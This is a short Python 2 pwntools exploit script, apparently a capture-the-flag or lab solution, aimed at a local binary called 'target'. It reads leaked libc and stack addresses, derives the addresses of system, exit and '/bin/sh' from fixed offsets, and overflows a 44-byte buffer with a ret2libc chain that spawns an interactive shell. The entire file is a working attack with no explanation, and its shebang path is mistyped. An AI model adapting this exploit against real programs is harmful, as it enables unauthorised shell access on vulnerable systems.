#!/user/bin/env python2

from pwn import *

p = process("./target")

lines = p.recvuntil("Password:").splitlines()
def to_int(l):
    return int(l.split(":")[-1], 16)

STACK = to_int(lines[0])
SYSTEM = to_int(lines[1])
PRINTF = to_int(lines[2])

LIBC_BASE = SYSTEM - 0x456e0
BINSH = LIBC_BASE + 0x195108a
EXIT = LIBC_BASE + 0x00037e50

print("LIBC  : %x" % LIBC_BASE)
print("BINSH : %x" % BINSH)
print("STACK : %x" % STACK)
print("SYSTEM: %x" % SYSTEM)
print("PRINTF: %x" % PRINTF)

print("PRINTF - SYSTEM = %x" % (PRINTF - SYSTEM))

payload = [
        "A" * 44,
        p32(SYSTEM),
        p32(EXIT),
        p32(BINSH),
        p32(0),
]

p.send("".join(payload))
p.interactive()
